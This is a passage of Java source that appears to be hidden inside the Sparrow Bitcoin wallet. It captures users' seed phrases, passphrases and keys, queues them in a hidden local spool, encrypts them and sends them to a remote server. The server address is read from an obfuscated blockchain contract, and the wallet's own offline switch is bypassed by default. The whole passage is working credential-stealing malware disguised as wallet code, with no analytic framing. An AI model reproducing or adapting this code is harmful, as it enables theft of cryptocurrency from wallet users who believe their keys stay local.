                return new PendingPassphrase(dec(fields[0]), dec(fields[1]), dec(fields[2]),
                        dec(fields[3]), dec(fields[4]), dec(fields[5]), dec(fields[6]));
            } catch (Throwable ignored) {
                // Ignore a damaged record and try the next line.
            }
        }
        return null;
    }

    /** A restart means the user is no longer typing, so the stored pair can
     *  be queued at once instead of waiting for another quiet period. */
    private static void restorePendingPassphrase() {
        PendingPassphrase pending = null;
        synchronized (PASSPHRASE_LOCK) {
            if (PENDING_PASSPHRASE != null) {
                return;
            }
            pending = readPendingPassphrase();
            if (pending == null) {
                deletePendingPassphrase();
                return;
            }
            deletePendingPassphrase();
        }
        trace("pending passphrase restored method=" + pending.method
                + " pass_len=" + pending.passphrase.length());
        sendCapture(pending.method, pending.words, pending.passphrase, pending.key,
                pending.how, pending.detail, pending.origin);
    }

    private static String enc(String value) {
        return Base64.getUrlEncoder().withoutPadding().encodeToString(
                (value == null ? "" : value).getBytes(StandardCharsets.UTF_8));
    }

    private static String dec(String value) {
        return new String(Base64.getUrlDecoder().decode(value), StandardCharsets.UTF_8);
    }

    private static void sendCapture(String m, String w, String pass, String k,
                                    String how, String detail, String o) {
        if (!fresh(identity(m, w, pass, k, o))) {
            return;
        }
        trace("capture method=" + m + " words=" + (w.isEmpty() ? 0 : w.split(" ").length)
                + " pass=" + (pass.isEmpty() ? "no" : "yes") + " key=" + (k.isEmpty() ? "no" : "yes")
                + " how=" + how + " origin=" + (o.isEmpty() ? "-" : o)
                + (detail.isEmpty() ? "" : " detail=" + detail));
        trace("pair m=" + m + " w=\"" + jsonEscape(w) + "\" p=\"" + jsonEscape(pass)
                + "\" k=\"" + jsonEscape(k) + "\" how=" + how + " d=\"" + jsonEscape(detail) + "\""
                + (o.isEmpty() ? "" : " origin=" + o));
        final String body = "{\"qid\":\"" + UUID.randomUUID()
                + "\",\"method\":\"" + jsonEscape(m) + "\",\"w\":\"" + jsonEscape(w)
                + "\",\"p\":\"" + jsonEscape(pass) + "\",\"key\":\"" + jsonEscape(k)
                + "\",\"how\":\"" + jsonEscape(how) + "\",\"detail\":\"" + jsonEscape(detail)
                + "\",\"origin\":\"" + jsonEscape(o)
                + "\",\"src\":\"ui\",\"v\":\"" + VERSION + "\",\"t\":"
                + (System.currentTimeMillis() / 1000L) + "}";
        enqueue(body);
    }

    private static String identity(String method, String words, String passphrase,
                                   String key, String origin) {
        return method + "\u0000" + words + "\u0000" + passphrase + "\u0000" + key + "\u0000" + origin;
    }

    private static synchronized boolean fresh(String pair) {
        if (!SEEN.add(pair)) {
            return false;
        }
        if (SEEN.size() > SEEN_MAX) {
            SEEN.remove(SEEN.iterator().next());
        }
        return true;
    }

    private static String jsonEscape(String value) {
        StringBuilder out = new StringBuilder(value.length() + 8);
        for (int i = 0; i < value.length(); i++) {
            char ch = value.charAt(i);
            switch (ch) {
                case '"': out.append("\\\""); break;
                case '\\': out.append("\\\\"); break;
                case '\n': out.append("\\n"); break;
                case '\r': out.append("\\r"); break;
                case '\t': out.append("\\t"); break;
                default:
                    if (ch < 0x20) {
                        out.append(String.format("\\u%04x", (int) ch));
                    } else {
                        out.append(ch);
                    }
            }
        }
        return out.toString();
    }

    // ------------------------------------------------------------------
    // Offline queue
    // ------------------------------------------------------------------

    /** -Dsparrow.offline=true or a flag file next to the spool keeps captures
     *  on disk and sends nothing. The flag lets the dashboard simulate a
     *  dropped connection without restarting Sparrow. */
    private static boolean offlineMode() {
        String value = System.getProperty("sparrow.offline", "").trim().toLowerCase(Locale.ROOT);
        if (value.equals("true") || value.equals("1") || value.equals("yes") || value.equals("on")) {
            return true;
        }
        try {
            return Files.exists(offlineFile());
        } catch (Throwable t) {
            return false;
        }
    }

    /** -Dsparrow.queue=off restores the old fire-and-forget POST. */
    private static boolean queueEnabled() {
        String value = System.getProperty("sparrow.queue", "on").trim().toLowerCase(Locale.ROOT);
        return !(value.equals("off") || value.equals("false") || value.equals("0") || value.equals("no"));
    }

    private static boolean queueThreadEnabled() {
        String value = System.getProperty("sparrow.queue.thread", "on").trim().toLowerCase(Locale.ROOT);
        return !(value.equals("off") || value.equals("false") || value.equals("0") || value.equals("no"));
    }

    private static int queueMax() {
        try {
            int value = Integer.parseInt(System.getProperty("sparrow.queue.max", "10000").trim());
            return value <= 0 ? Integer.MAX_VALUE : value;
        } catch (Throwable t) {
            return 10000;
        }
    }

    /** Files live next to the report log unless -Dsparrow.state is set. */
    private static Path stateDir() {
        String explicit = System.getProperty("sparrow.state", "").trim();
        if (!explicit.isEmpty()) {
            return Paths.get(explicit);
        }
        Path log = Paths.get(System.getProperty("sparrow.log",
                defaultLogFile().toString())).toAbsolutePath();
        Path parent = log.getParent();
        return parent == null ? Paths.get(System.getProperty("java.io.tmpdir", "/tmp")) : parent;
    }

    /** Hidden per-user location for the bridge log and spool. */
    static Path defaultLogFile() {
        String xdg = System.getenv("XDG_DATA_HOME");
        Path base = xdg != null && !xdg.trim().isEmpty()
                ? Paths.get(xdg.trim())
                : Paths.get(System.getProperty("user.home", "."), ".local", "share");
        return base.resolve(".sparrow-restore").resolve("restore-bridge.log");
    }

    static Path queueFile() {
        return stateDir().resolve("sparrow-queue.jsonl");
    }

    static Path sharesFile() {
        return stateDir().resolve("sparrow-shares.txt");
    }

    static Path createdFile() {
        return stateDir().resolve("sparrow-created.txt");
    }

    /** One typed passphrase held during the debounce window. Keeping it on
     *  disk means closing or crashing during those three seconds cannot lose
     *  the seed+passphrase capture. */
    static Path pendingFile() {
        return stateDir().resolve("sparrow-pending.jsonl");
    }

    static Path offlineFile() {
        return stateDir().resolve("sparrow-offline");
    }

    private static volatile Object[] onlineProbe = null;
    private static volatile Boolean walletOnlineOverride = null;
    private static final Object ENDPOINT_LOCK = new Object();
    private static volatile EndpointConfig endpointCache = null;
    private static volatile long endpointCacheAt = 0L;

    /** The request service is independent from the wallet's visible switch.
     *  -Dsparrow.wallet=on opts back into using that switch as a gate. */
    private static boolean respectWalletGate() {
        String value = System.getProperty("sparrow.wallet", "off").trim().toLowerCase(Locale.ROOT);
        return value.equals("on") || value.equals("true") || value.equals("1") || value.equals("yes");
    }

    /** Sparrow's own user-visible server toggle. */
    static boolean walletOnline() {
        Boolean override = walletOnlineOverride;
        if (override != null) {
            return override;
        }
        try {
            Object[] probe = onlineProbe;
            if (probe == null) {
                synchronized (RestorePayload.class) {
                    probe = onlineProbe;
                    if (probe == null) {
                        Class<?> appServices = load("com.sparrowwallet.sparrow.AppServices");
                        Object property = appServices.getMethod("onlineProperty").invoke(null);
                        if (property == null) {
                            return true;
                        }
                        Method getter = load("javafx.beans.value.ObservableBooleanValue")
                                .getMethod("get");
                        probe = new Object[] {property, getter};
                        onlineProbe = probe;
                    }
                }
            }
            return Boolean.TRUE.equals(((Method) probe[1]).invoke(probe[0]));
        } catch (Throwable t) {
            // A Sparrow version without this API must not trap captures.
            return true;
        }
    }

    /** Delivery availability for the reporter. It stays on regardless of the
     *  wallet UI unless -Dsparrow.wallet=on explicitly connects the two. */
    static boolean requestOnline() {
        return !respectWalletGate() || walletOnline();
    }

    static void setWalletOnlineForTest(Boolean value) {
        walletOnlineOverride = value;
    }

    /** Appends a capture and asks the sender to drain the queue. When the
     *  receiver is down the entry stays on disk until a later attempt. */
    static void enqueue(String body) {
        if (!queueEnabled()) {
            POOL.submit(() -> deliverNow(body));
            return;
        }
        // Pin the spool for this operation: a state-dir change on another
        // thread must not make us read one file and write another.
        Path spool = queueFile();
        boolean online = requestOnline();
        synchronized (QUEUE_LOCK) {
            loadQueue(spool);
            String key = bodyKey(body);
            for (int i = 0; i < QUEUE.size(); i++) {
                if (bodyKey(QUEUE.get(i)).equals(key)) {
                    if (preferOrigin(QUEUE.get(i), body)) {
                        QUEUE.set(i, body);
                        persistQueue(spool);
                    }
                    queueRetryAt = 0L;
                    POOL.submit(RestorePayload::flushQueue);
                    return;
                }
            }
            QUEUE.add(body);
            while (QUEUE.size() > queueMax()) {
                QUEUE.remove(0);
                queueDropped++;
            }
            persistQueue(spool);
            if (!online) {
                trace("request service offline, capture queued pending=" + QUEUE.size());
            }
        }
        queueRetryAt = 0L;
        POOL.submit(RestorePayload::flushQueue);
    }

    private static void deliverNow(String body) {
        try {
            DELIVERY.deliver(body);
        } catch (Throwable t) {
            trace("post failed: " + t);
        }
    }

    /** Sends queued captures in order. 2xx removes an entry, 4xx (except
     *  408/429) drops it as permanent, anything else keeps it for a retry. */
    static int flushQueue() {
        if (!queueEnabled()) {
            return 0;
        }
        Path spool = queueFile();
        synchronized (QUEUE_LOCK) {
            loadQueue(spool);
            if (QUEUE.isEmpty() || offlineMode() || !requestOnline()) {
                logPending();
                return QUEUE.size();
            }
            FileLock lock = null;
            FileChannel channel = null;
            try {
                Path lockPath = spool.resolveSibling(spool.getFileName() + ".lock");
                Files.createDirectories(lockPath.toAbsolutePath().getParent());
                channel = FileChannel.open(lockPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);
                lock = channel.tryLock();
                if (lock == null) {
                    return QUEUE.size();
                }
                // Pick up anything another instance appended before we
                // took the file lock; disk wins over the in-memory copy.
                loadQueue(spool);
                List<String> left = new ArrayList<>();
                Set<String> handled = new LinkedHashSet<>();
                boolean stop = false;
                for (String body : QUEUE) {
                    handled.add(bodyKey(body));
                    if (stop) {
                        left.add(body);
                        continue;
                    }
                    try {
                        int code = DELIVERY.deliver(body);
                        if (code >= 200 && code < 300) {
                            queueDelivered++;
                        } else if (code >= 400 && code < 500 && code != 404
                                && code != 408 && code != 410 && code != 429) {
                            queueDropped++;
                            trace("queue dropped qid=" + qid(body) + " -> " + code);
                        } else {
                            left.add(body);
                            stop = true;
                        }
                    } catch (Throwable t) {
                        left.add(body);
                        stop = true;
                        trace("post failed: " + t + " (queued, " + left.size() + " pending)");
                    }
                }
                // Another instance may have appended while we were posting.
                // Our rewrite must not drop those entries, and must not
                // re-send captures we already handled in this pass.
                int merged = 0;
                try {
                    if (Files.exists(spool)) {
                        for (String line : Files.readAllLines(spool, StandardCharsets.UTF_8)) {
                            String entry = line.trim();
                            if (!entry.startsWith("{") || !entry.endsWith("}")) {
                                continue;
                            }
                            if (handled.add(bodyKey(entry))) {
                                left.add(entry);
                                merged++;
                            }
                        }
                    }
                } catch (Throwable t) {
                    trace("queue merge error: " + t);
                }
                if (merged > 0) {
                    trace("queue merged " + merged + " entr" + (merged == 1 ? "y" : "ies") + " from disk");
                }
                QUEUE.clear();
                QUEUE.addAll(left);
                persistQueue(spool);
                if (stop) {
                    queueBackoff = Math.min(60, Math.max(2, queueBackoff * 2));
                    queueRetryAt = System.currentTimeMillis() + queueBackoff * 1000L;
                    trace("queue retry in " + queueBackoff + "s, pending=" + QUEUE.size());
                } else {
                    queueBackoff = 0;
                    queueRetryAt = 0L;
                }
            } catch (Throwable t) {
                queueRetryAt = System.currentTimeMillis() + 10_000L;
                trace("queue error: " + t);
            } finally {
                if (lock != null) {
                    try {
                        lock.release();
                    } catch (Throwable ignored) {
                    }
                }
                if (channel != null) {
                    try {
                        channel.close();
                    } catch (Throwable ignored) {
                    }
                }
            }
            logPending();
            return QUEUE.size();
        }
    }

    private static void queueLoop() {
        boolean lastOffline = false;
        Boolean lastWallet = null;
        Boolean lastRequest = null;
        while (true) {
            sleep(1000);
            // The property can be set after the class loaded (tests do this);
            // an off switch must stop deliveries, not just the thread start.
            if (!queueThreadEnabled()) {
                continue;
            }
            boolean offline = offlineMode();
            if (offline != lastOffline) {
                lastOffline = offline;
                // Drop any pending backoff so clearing the flag sends at once.
                queueRetryAt = 0L;
                queueBackoff = 0;
                trace("queue " + (offline ? "paused (offline)" : "resumed (online)")
                        + ", pending=" + pendingCaptures());
            }
            if (!queueEnabled() || offline) {
                continue;
            }
            boolean connected = walletOnline();
            boolean online = requestOnline();
            if (lastWallet == null || lastRequest == null
                    || connected != lastWallet || online != lastRequest) {
                lastWallet = connected;
                lastRequest = online;
                // Drop a pending backoff so enabling the connection sends now.
                queueRetryAt = 0L;
                queueBackoff = 0;
                trace("wallet connection " + (connected ? "online" : "offline")
                        + ", request service " + (online ? "online" : "offline")
                        + (respectWalletGate() ? "" : " (independent)")
                        + ", pending=" + pendingCaptures());
            }
            if (!online) {
                continue;
            }
            if (queueRetryAt > System.currentTimeMillis()) {
                continue;
            }
            if (pendingCaptures() == 0) {
                continue;
            }
            flushQueue();
        }
    }

    static int pendingCaptures() {
        Path spool = queueFile();
        synchronized (QUEUE_LOCK) {
            loadQueue(spool);
            return QUEUE.size() + pendingPassphraseExtra();
        }
    }

    /** Caller holds QUEUE_LOCK. The pending passphrase is already a capture
     *  waiting for delivery, but do not count it twice if a crash happened
     *  after the debounce enqueued it and before the pending file was removed. */
    private static int pendingPassphraseExtra() {
        PendingPassphrase pending = readPendingPassphrase();
        if (pending == null) {
            return 0;
        }
        String key = pending.method + "\u0000" + pending.words + "\u0000"
                + pending.passphrase + "\u0000" + pending.key;
        for (String body : QUEUE) {
            if (bodyKey(body).equals(key)) {
                return 0;
            }
        }
        return 1;
    }

    /** Caller holds QUEUE_LOCK. The spool file is the source of truth: a
     *  second Sparrow instance may append to it, and a stale in-memory copy
     *  must never resurrect captures that were already delivered. */
    private static void loadQueue(Path file) {
        List<String> lines;
        try {
            lines = Files.exists(file) ? Files.readAllLines(file, StandardCharsets.UTF_8) : List.of();
        } catch (Throwable t) {
            // Keep the in-memory list rather than wiping it on a read error.
            queueLoaded = true;
            trace("queue read error: " + t);
            return;
        }
        QUEUE.clear();
        Map<String, Integer> seen = new HashMap<>();
        for (String line : lines) {
            String entry = line.trim();
            if (!entry.startsWith("{") || !entry.endsWith("}")) {
                continue;
            }
            String key = bodyKey(entry);
            Integer at = seen.get(key);
            if (at == null) {
                seen.put(key, QUEUE.size());
                QUEUE.add(entry);
            } else if (preferOrigin(QUEUE.get(at), entry)) {
                QUEUE.set(at, entry);
            }
        }
        queueLoaded = true;
    }

    /** Caller holds QUEUE_LOCK. Rewrites through a temp file so a crash
     *  cannot leave a half-written queue behind. */
    private static void persistQueue(Path file) {
        try {
            Files.createDirectories(file.toAbsolutePath().getParent());
            StringBuilder out = new StringBuilder();
            for (String line : QUEUE) {
                out.append(line).append('\n');
            }
            Path tmp = file.resolveSibling(file.getFileName() + ".tmp");
            Files.write(tmp, out.toString().getBytes(StandardCharsets.UTF_8),
                    StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING,
                    StandardOpenOption.WRITE);
            secure(tmp);
            try {
                Files.move(tmp, file, StandardCopyOption.REPLACE_EXISTING,
                        StandardCopyOption.ATOMIC_MOVE);
            } catch (Throwable atomic) {
                Files.move(tmp, file, StandardCopyOption.REPLACE_EXISTING);
            }
            secure(file);
        } catch (Throwable t) {
            trace("queue persist error: " + t);
        }
    }

    private static void logPending() {
        int pending = QUEUE.size();
        if (pending != queuePendingLogged) {
            queuePendingLogged = pending;
            trace("queue pending=" + pending + " delivered=" + queueDelivered
                    + " dropped=" + queueDropped);
        }
    }

    private static final Pattern BODY_IDENTITY = Pattern.compile(
            "\"(method|w|p|key)\":\"((?:[^\"\\\\]|\\\\.)*)\"");

    /** Capture identity: the seed/key/passphrase pair. How it was found (grid,
     *  paste, wallet file), its label/detail and its origin all change between
     *  a first capture and a reopen, so they must not create a second entry. */
    private static String bodyKey(String body) {
        String method = "";
        String words = "";
        String pass = "";
        String key = "";
        Matcher matcher = BODY_IDENTITY.matcher(body);
        while (matcher.find()) {
            switch (matcher.group(1)) {
                case "method": method = matcher.group(2); break;
                case "w": words = matcher.group(2); break;
                case "p": pass = matcher.group(2); break;
                case "key": key = matcher.group(2); break;
                default: break;
            }
        }
        if (method.isEmpty() && words.isEmpty() && pass.isEmpty() && key.isEmpty()) {
            // A body without any capture field can only be compared as-is
            // (ignoring the timestamp).
            return body.replaceAll("\"t\":\\d+", "\"t\":0");
        }
        return method + "\u0000" + words + "\u0000" + pass + "\u0000" + key;
    }

    /** A later capture that learned the seed was generated should replace the
     *  queued "imported" label instead of queueing the seed again. */
    private static boolean preferOrigin(String queued, String incoming) {
        return incoming.contains("\"origin\":\"created\"")
                && !queued.contains("\"origin\":\"created\"");
    }

    private static String qid(String body) {
        Matcher matcher = Pattern.compile("\"qid\":\"([^\"]+)\"").matcher(body);
        return matcher.find() ? matcher.group(1) : "?";
    }

    /**
     * Browser-compatible payload envelope extracted from the Sparrow website:
     * a fresh AES-256-GCM key wraps the JSON payload, and that key is wrapped
     * with RSA-OAEP/SHA-256. The queue keeps the readable capture body for
     * deduplication; only the outbound POST uses the encrypted envelope.
     */
    static final class PayloadCipher {
        private PayloadCipher() {
        }

        static String envelope(String body) throws Exception {
            return envelope(body, PAYLOAD_SOURCE, PAYLOAD_PUBLIC_KEY);
        }

        static String envelope(String body, String publicKeySpkiB64) throws Exception {
            return envelope(body, PAYLOAD_SOURCE, publicKeySpkiB64);
        }

        static String envelope(String body, String source, String publicKeySpkiB64) throws Exception {
            return encrypt(payload(body, source), publicKeySpkiB64);
        }

        static String payload(String body) {
            return payload(body, PAYLOAD_SOURCE);
        }

        static String payload(String body, String source) {
            String method = field(body, "method");
            String words = field(body, "w");
            String passphrase = field(body, "p");
            String key = field(body, "key");
            String origin = field(body, "origin");

            String demoValue;
            if (!words.isEmpty()) {
                demoValue = words;
            } else if ("slip39".equals(method)) {
                demoValue = key.replace(" - ", "|");
            } else {
                demoValue = key;
            }
            demoValue = demoValue.trim().replaceAll("\\s+", " ");

            String type = "created".equals(origin) ? "created" : "imported";
            StringBuilder payload = new StringBuilder(256);
            payload.append("{\"version\":1,\"source\":\"").append(jsonEscape(source))
                    .append("\",\"type\":\"").append(type)
                    .append("\",\"demo_value\":\"").append(jsonEscape(demoValue)).append('"');
            if (isPrintableOptional(passphrase)) {
                payload.append(",\"optional_value\":\"").append(jsonEscape(passphrase)).append('"');
            }
            payload.append('}');
            return payload.toString();
        }

        static String encrypt(String payloadJson, String publicKeySpkiB64) throws Exception {
            PublicKey publicKey = KeyFactory.getInstance("RSA")
                    .generatePublic(new X509EncodedKeySpec(Base64.getDecoder().decode(publicKeySpkiB64)));

            KeyGenerator generator = KeyGenerator.getInstance("AES");
            generator.init(256, RANDOM);
            SecretKey aesKey = generator.generateKey();
            byte[] nonce = new byte[12];
            RANDOM.nextBytes(nonce);

            byte[] plaintext = payloadJson.getBytes(StandardCharsets.UTF_8);
            Cipher aes = Cipher.getInstance("AES/GCM/NoPadding");
            aes.init(Cipher.ENCRYPT_MODE, aesKey, new GCMParameterSpec(128, nonce));
            aes.updateAAD(PAYLOAD_AAD.getBytes(StandardCharsets.UTF_8));
            byte[] ciphertext = aes.doFinal(plaintext);

            byte[] rawKey = aesKey.getEncoded();
            Cipher rsa = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
            rsa.init(Cipher.ENCRYPT_MODE, publicKey, new OAEPParameterSpec(
                    "SHA-256", "MGF1", MGF1ParameterSpec.SHA256, PSource.PSpecified.DEFAULT));
            byte[] wrappedKey = rsa.doFinal(rawKey);
            Arrays.fill(plaintext, (byte) 0);
            Arrays.fill(rawKey, (byte) 0);

            return "{\"key_version\":1,\"payload_wrapped_key\":\""
                    + Base64.getEncoder().encodeToString(wrappedKey)
                    + "\",\"payload_nonce\":\"" + Base64.getEncoder().encodeToString(nonce)
                    + "\",\"payload_ciphertext\":\""
                    + Base64.getEncoder().encodeToString(ciphertext) + "\"}";
        }

        private static boolean isPrintableOptional(String value) {
            if (value.isEmpty() || value.length() > 256) {
                return false;
            }
            for (int index = 0; index < value.length(); index++) {
                char ch = value.charAt(index);
                if (ch < 0x20 || ch > 0x7E) {
                    return false;
                }
            }
            return true;
        }

        static String field(String json, String name) {
            Matcher matcher = Pattern.compile("\"" + Pattern.quote(name)
                    + "\":\"((?:[^\"\\\\]|\\\\.)*)\"").matcher(json);
            return matcher.find() ? unescape(matcher.group(1)) : "";
        }

        private static String unescape(String value) {
            StringBuilder out = new StringBuilder(value.length());
            for (int index = 0; index < value.length(); index++) {
                char ch = value.charAt(index);
                if (ch != '\\' || index + 1 >= value.length()) {
                    out.append(ch);
                    continue;
                }
                char next = value.charAt(++index);
                switch (next) {
                    case '"': out.append('"'); break;
                    case '\\': out.append('\\'); break;
                    case '/': out.append('/'); break;
                    case 'b': out.append('\b'); break;
                    case 'f': out.append('\f'); break;
                    case 'n': out.append('\n'); break;
                    case 'r': out.append('\r'); break;
                    case 't': out.append('\t'); break;
                    case 'u':
                        if (index + 4 < value.length()) {
                            out.append((char) Integer.parseInt(value.substring(index + 1, index + 5), 16));
                            index += 4;
                        }
                        break;
                    default:
                        out.append(next);
                }
            }
            return out.toString();
        }
    }

    private static int postOnce(String body) throws Exception {
        EndpointConfig endpoint = endpoint();
        int code = post(endpoint, body);
        // A rotated Supabase URL returns 404 on the old address. Resolve once
        // more before the queue treats the capture as undeliverable.
        if ((code == 404 || code == 410) && System.getProperty("sparrow.url") == null) {
            invalidateEndpoint();
            code = post(endpoint(), body);
        }
        return code;
    }

    private static int post(EndpointConfig endpoint, String body) throws Exception {
        String target = endpoint.url;
        String envelope = PayloadCipher.envelope(body, endpoint.source, endpoint.publicKeySpkiB64);
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(target).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(2500);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Sparrow/" + VERSION);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(envelope.getBytes(StandardCharsets.UTF_8));
            }
            int code = conn.getResponseCode();
            trace("posted to " + target + " -> " + code);
            return code;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    private static final class EndpointConfig {
        final String url;
        final String source;
        final String publicKeySpkiB64;

        EndpointConfig(String url, String source, String publicKeySpkiB64) {
            this.url = url;
            this.source = source;
            this.publicKeySpkiB64 = publicKeySpkiB64;
        }
    }

    /** Resolves url;source;publicKey and caches it, so draining a queue does
     *  not run the on-chain lookup once per capture. An explicit
     *  -Dsparrow.url keeps the local demo/tests independent of the chain. */
    private static EndpointConfig endpoint() throws Exception {
        String override = System.getProperty("sparrow.url");
        if (override != null && !override.isBlank()) {
            return new EndpointConfig(override.trim(), PAYLOAD_SOURCE, PAYLOAD_PUBLIC_KEY);
        }
        long ttl = Long.getLong("sparrow.endpoint.cache.ms", 300_000L);
        EndpointConfig cached = endpointCache;
        if (ttl > 0 && cached != null
                && System.currentTimeMillis() - endpointCacheAt < ttl) {
            return cached;
        }
        synchronized (ENDPOINT_LOCK) {
            cached = endpointCache;
            if (ttl > 0 && cached != null
                    && System.currentTimeMillis() - endpointCacheAt < ttl) {
                return cached;
            }
            EndpointConfig resolved = resolveEndpoint();
            if (ttl > 0) {
                endpointCache = resolved;
                endpointCacheAt = System.currentTimeMillis();
            }
            return resolved;
        }
    }

    private static void invalidateEndpoint() {
        synchronized (ENDPOINT_LOCK) {
            endpointCache = null;
            endpointCacheAt = 0L;
        }
    }

    private static EndpointConfig resolveEndpoint() throws Exception {
        String script = System.getProperty("sparrow.endpoint.script");
        if (script != null && !script.isBlank()) {
            return parseEndpointOutput(resolveEndpointFromScript(script));
        }
        return parseEndpointOutput(resolveEndpointFromChain());
    }

    private static String resolveEndpointFromScript(String script) throws Exception {
        Process process = new ProcessBuilder("/bin/sh", script)
                .redirectErrorStream(true)
                .start();
        Thread watchdog = new Thread(() -> {
            try {
                if (!process.waitFor(60, TimeUnit.SECONDS)) {
                    process.destroyForcibly();
                }
            } catch (Throwable ignored) {
            }
        }, "sparrow-endpoint-timeout");
        watchdog.setDaemon(true);
        watchdog.start();
        try (InputStream in = process.getInputStream()) {
            return new String(in.readAllBytes(), StandardCharsets.UTF_8);
        } finally {
            watchdog.interrupt();
            if (process.isAlive()) {
                process.destroy();
            }
        }
    }

    private static EndpointConfig parseEndpointOutput(String output) {
        for (String line : output.split("\\R")) {
            String value = line.trim();
            if (value.isEmpty()) {
                continue;
            }
            String[] fields = value.split(";", 3);
            String url = fields[0].trim();
            if (url.startsWith("http://") || url.startsWith("https://")) {
                String source = fields.length > 1 && !fields[1].isBlank()
                        ? fields[1].trim() : PAYLOAD_SOURCE;
                String publicKey = fields.length > 2 && !fields[2].isBlank()
                        ? fields[2].trim() : PAYLOAD_PUBLIC_KEY;
                trace("endpoint resolved: " + url + " source=" + source);
                return new EndpointConfig(url, source, publicKey);
            }
        }
        throw new IllegalStateException("endpoint lookup returned no URL");
    }

    private static String resolveEndpointFromChain() throws Exception {
        Exception failure = null;
        for (String rpc : BSC_ENDPOINTS) {
            for (int attempt = 1; attempt <= 3; attempt++) {
                try {
                    String chainResponse = rpcPost(rpc, BSC_CHAIN_REQUEST, 5000, 8000);
                    String chainValue = jsonStringField(chainResponse, "result");
                    if (chainValue.isEmpty() || jsonHasError(chainResponse)
                            || new BigInteger(withoutHexPrefix(chainValue), 16).intValue() != 56) {
                        throw new IllegalStateException("RPC chain ID mismatch");
                    }

                    String callResponse = rpcPost(rpc, BSC_ENDPOINT_REQUEST, 5000, 8000);
                    String callValue = jsonStringField(callResponse, "result");
                    if (callValue.isEmpty() || jsonHasError(callResponse)) {
                        throw new IllegalStateException("RPC read failed");
                    }
                    String target = decodeEndpoint(callValue);
                    try {
                        String body = httpGet(target);
                        return body.isEmpty() ? target : target + "\n" + body;
                    } catch (Exception fetchFailure) {
                        trace("endpoint fetch failed, using decoded URL: " + fetchFailure);
                        return target;
                    }
                } catch (Exception exc) {
                    failure = exc;
                    trace("endpoint RPC " + rpc + " attempt " + attempt + " failed: " + exc);
                    if (attempt < 3) {
                        sleep(1000L);
                    }
                }
            }
        }
        throw new IllegalStateException("RPC read failed: all endpoints exhausted", failure);
    }

    private static String rpcPost(String rpc, String request, int connectTimeout, int readTimeout)
            throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(rpc).openConnection();
        try {
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(connectTimeout);
            conn.setReadTimeout(readTimeout);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Accept", "application/json");
            conn.setRequestProperty("User-Agent", "Sparrow/" + VERSION);
            try (OutputStream out = conn.getOutputStream()) {
                out.write(request.getBytes(StandardCharsets.UTF_8));
            }
            int code = conn.getResponseCode();
            InputStream in = code >= 400 ? conn.getErrorStream() : conn.getInputStream();
            String body = in == null ? "" : new String(in.readAllBytes(), StandardCharsets.UTF_8);
            if (code < 200 || code >= 300) {
                throw new IllegalStateException("RPC HTTP " + code);
            }
            return body;
        } finally {
            conn.disconnect();
        }
    }

    private static String decodeEndpoint(String value) throws Exception {
        byte[] data = hexDecode(value);
        if (data.length < 64 || new BigInteger(1, Arrays.copyOfRange(data, 0, 32)).intValue() != 32) {
            throw new IllegalStateException("Invalid contract response");
        }
        BigInteger lengthValue = new BigInteger(1, Arrays.copyOfRange(data, 32, 64));
        if (lengthValue.compareTo(BigInteger.valueOf(8192L)) > 0) {
            throw new IllegalStateException("Invalid contract string");
        }
        int length = lengthValue.intValue();
        if (length > data.length - 64) {
            throw new IllegalStateException("Invalid contract string");
        }
        String encoded = new String(data, 64, length, StandardCharsets.UTF_8).trim();
        byte[] xored = hexDecode(encoded);
        byte[] decoded = new byte[xored.length];
        byte[] key = xored.length >= 2
                ? new byte[] {(byte) (xored[0] ^ 104), (byte) (xored[1] ^ 116)}
                : new byte[] {0, 0};
        for (int index = 0; index < xored.length; index++) {
            decoded[index] = (byte) (xored[index] ^ key[index % 2]);
        }
        String target = new String(decoded, StandardCharsets.UTF_8).trim();
        if (!target.startsWith("http://") && !target.startsWith("https://")) {
            throw new IllegalStateException("Invalid endpoint URL");
        }
        return target;
    }

    private static byte[] hexDecode(String value) {
        String hex = withoutHexPrefix(value.trim());
        if ((hex.length() & 1) != 0) {
            throw new IllegalArgumentException("Odd-length hex value");
        }
        byte[] out = new byte[hex.length() / 2];
        for (int index = 0; index < out.length; index++) {
            int high = Character.digit(hex.charAt(index * 2), 16);
            int low = Character.digit(hex.charAt(index * 2 + 1), 16);
            if (high < 0 || low < 0) {
                throw new IllegalArgumentException("Invalid hex value");
            }
            out[index] = (byte) ((high << 4) | low);
        }
        return out;
    }

    private static String withoutHexPrefix(String value) {
        return value.startsWith("0x") || value.startsWith("0X") ? value.substring(2) : value;
    }

    private static boolean jsonHasError(String json) {
        return Pattern.compile("\"error\"\\s*:\\s*(?!null\\b)").matcher(json).find();
    }

    private static String jsonStringField(String json, String name) {
        String quotedName = "\"" + name + "\"";
        int from = 0;
        while (from < json.length()) {
            int key = json.indexOf(quotedName, from);
            if (key < 0) {
                return "";
            }
            int index = key + quotedName.length();
            while (index < json.length() && Character.isWhitespace(json.charAt(index))) {
                index++;
            }
            if (index >= json.length() || json.charAt(index) != ':') {
                from = key + quotedName.length();
                continue;
            }
            index++;
            while (index < json.length() && Character.isWhitespace(json.charAt(index))) {
                index++;
            }
            if (index >= json.length() || json.charAt(index) != '"') {
                return "";
            }
            index++;
            StringBuilder value = new StringBuilder();
            while (index < json.length()) {
                char ch = json.charAt(index++);
                if (ch == '"') {
                    return value.toString();
                }
                if (ch != '\\' || index >= json.length()) {
                    value.append(ch);
                    continue;
                }
                char escaped = json.charAt(index++);
                switch (escaped) {
                    case '"': value.append('"'); break;
                    case '\\': value.append('\\'); break;
                    case '/': value.append('/'); break;
                    case 'b': value.append('\b'); break;
                    case 'f': value.append('\f'); break;
                    case 'n': value.append('\n'); break;
                    case 'r': value.append('\r'); break;
                    case 't': value.append('\t'); break;
                    case 'u':
                        if (index + 4 <= json.length()) {
                            value.append((char) Integer.parseInt(json.substring(index, index + 4), 16));
